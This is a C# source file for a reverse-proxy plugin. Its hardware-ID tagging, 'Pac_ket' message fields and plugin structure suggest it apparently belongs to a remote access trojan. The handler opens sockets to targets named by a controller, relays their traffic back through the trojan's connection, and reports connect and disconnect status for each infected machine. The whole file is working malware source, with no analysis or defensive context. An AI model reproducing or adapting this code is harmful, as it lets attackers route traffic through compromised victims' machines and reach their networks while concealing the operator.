using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using MessagePackLib.MessagePack;
using Plugin;

namespace ReverseProxy.Handler
{
    public class HandleReverseProxy
    {
        public const int BUFFER_SIZE = 8192;
        public static readonly object _proxyClientsLock = new object();
        public static List<HandleReverseProxy> _proxyClients = new List<HandleReverseProxy>();
        private byte[] _buffer;
        private bool _disconnectIsSend;

        public HandleReverseProxy(int ConnectionId, string Target, int Port)
        {
            this.ConnectionId = ConnectionId;
            this.Target = Target;
            this.Port = Port;
            Handle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

            //Non-Blocking connect, so there is no need for a extra thread to create
            Handle.BeginConnect(Target, Port, Handle_Connect, null);
        }

        public int ConnectionId { get; }
        public Socket Handle { get; }
        public string Target { get; }
        public int Port { get; private set; }

        private void Handle_Connect(IAsyncResult ar)
        {
            try
            {
                Handle.EndConnect(ar);
            }
            catch
            {
            }

            if (Handle.Connected)
            {
                try
                {
                    _buffer = new byte[BUFFER_SIZE];
                    Handle.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, AsyncReceive, null);
                }
                catch
                {
                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "reverseProxy";
                    msgpack.ForcePathObject("Option").AsString = "ReverseProxyConnectResponse";
                    msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                    msgpack.ForcePathObject("ConnectionId").AsInteger = ConnectionId;
                    msgpack.ForcePathObject("IsConnected").SetAsBoolean(false);
                    msgpack.ForcePathObject("LocalAddress").SetAsBytes(null);
                    msgpack.ForcePathObject("LocalPort").AsInteger = 0;
                    msgpack.ForcePathObject("HostName").AsString = Target;
                    Connection.Send(msgpack.Encode2Bytes());

                    Disconnect();
                }

                var localEndPoint = (IPEndPoint)Handle.LocalEndPoint;
                var msgpack1 = new MsgPack();
                msgpack1.ForcePathObject("Pac_ket").AsString = "reverseProxy";
                msgpack1.ForcePathObject("Option").AsString = "ReverseProxyConnectResponse";
                msgpack1.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack1.ForcePathObject("ConnectionId").AsInteger = ConnectionId;
                msgpack1.ForcePathObject("IsConnected").SetAsBoolean(true);
                msgpack1.ForcePathObject("LocalAddress").SetAsBytes(localEndPoint.Address.GetAddressBytes());
                msgpack1.ForcePathObject("LocalPort").AsInteger = localEndPoint.Port;
                msgpack1.ForcePathObject("HostName").AsString = Target;
                Connection.Send(msgpack1.Encode2Bytes());
            }
            else
            {
                var msgpack1 = new MsgPack();
                msgpack1.ForcePathObject("Pac_ket").AsString = "reverseProxy";
                msgpack1.ForcePathObject("Option").AsString = "ReverseProxyConnectResponse";
                msgpack1.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack1.ForcePathObject("ConnectionId").AsInteger = ConnectionId;
                msgpack1.ForcePathObject("IsConnected").SetAsBoolean(false);
                msgpack1.ForcePathObject("LocalAddress").SetAsBytes(null);
                msgpack1.ForcePathObject("LocalPort").AsInteger = 0;
                msgpack1.ForcePathObject("HostName").AsString = Target;
                Connection.Send(msgpack1.Encode2Bytes());
            }
        }

        private void AsyncReceive(IAsyncResult ar)
        {
            //Receive here data from e.g. a WebServer

            try
            {
                var received = Handle.EndReceive(ar);

                if (received <= 0)
                {
                    Disconnect();
                    return;
                }

                var payload = new byte[received];
                Array.Copy(_buffer, payload, received);
                var msgpack1 = new MsgPack();
                msgpack1.ForcePathObject("Pac_ket").AsString = "reverseProxy";
                msgpack1.ForcePathObject("Option").AsString = "ReverseProxyData";
                msgpack1.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack1.ForcePathObject("ConnectionId").AsInteger = ConnectionId;
                msgpack1.ForcePathObject("Data").SetAsBytes(payload);
                Connection.Send(msgpack1.Encode2Bytes());
            }
            catch
            {
                Disconnect();
                return;
            }

            try
            {
                Handle.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, AsyncReceive, null);
            }
            catch
            {
                Disconnect();
            }
        }

        public void Disconnect()
        {
            if (!_disconnectIsSend)
            {
                _disconnectIsSend = true;
                //send to the Server we've been disconnected
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "reverseProxy";
                msgpack.ForcePathObject("Option").AsString = "ReverseProxyDisconnect";
                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack.ForcePathObject("ConnectionId").AsInteger = ConnectionId;
                Connection.Send(msgpack.Encode2Bytes());
            }

            try
            {
                Handle.Close();
            }
            catch
            {
            }

            RemoveProxyClient(ConnectionId);
        }

        public void SendToTargetServer(byte[] data)
        {
            try
            {
                Handle.Send(data);
            }
            catch
            {
                Disconnect();
            }
        }

        public void RemoveProxyClient(int connectionId)
        {
            try
            {
                lock (_proxyClientsLock)
                {
                    for (var i = 0; i < _proxyClients.Count; i++)
                        if (_proxyClients[i].ConnectionId == connectionId)
                        {
                            _proxyClients.RemoveAt(i);
                            break;
                        }
                }
            }
            catch
            {
            }
        }
    }
}